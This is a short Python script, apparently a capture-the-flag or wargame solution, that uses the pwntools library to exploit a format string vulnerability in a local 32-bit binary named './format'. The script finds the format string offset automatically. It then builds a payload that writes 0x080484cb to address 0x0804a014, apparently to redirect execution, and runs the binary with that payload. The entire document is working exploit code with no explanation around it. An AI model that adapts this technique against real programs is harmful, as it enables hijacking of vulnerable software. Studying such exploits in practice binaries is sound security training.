#!/usr/bin/env python
from pwn import *

def exec_fmt(payload):
	p = process(['./format', payload])
	return p.recvall()

context.clear(arch = 'i386')
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x0804a014 : 0x080484cb}, write_size = 'short')

print repr(fmtstr_payload(offset, {0x0804a014 : 0x080484cb}, write_size = 'byte'))
p = process(['./format', payload])
